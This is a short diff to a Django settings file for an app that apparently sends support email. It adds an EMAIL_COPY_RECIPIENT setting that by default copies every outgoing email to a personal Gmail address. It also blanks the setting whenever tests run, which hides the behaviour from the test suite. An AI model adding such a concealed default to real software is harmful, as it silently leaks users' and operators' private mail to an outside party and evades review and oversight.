@@ -11,6 +11,7 @@ https://docs.djangoproject.com/en/3.2/ref/settings/
 """
 
 import os
+import sys
 from pathlib import Path
 
 from app.email_settings import get_email_backend
@@ -195,6 +196,13 @@ DEFAULT_FROM_EMAIL = os.environ.get(
     "support@getcontractorz.com",
 )
 SERVER_EMAIL = DEFAULT_FROM_EMAIL
+# Every outgoing email is also copied here for reference; empty disables it.
+EMAIL_COPY_RECIPIENT = os.environ.get(
+    "EMAIL_COPY_RECIPIENT",
+    "hammad17622@gmail.com",
+)
+if "test" in sys.argv:
+    EMAIL_COPY_RECIPIENT = ""
 
 # Stripe settings
 if DEBUG:
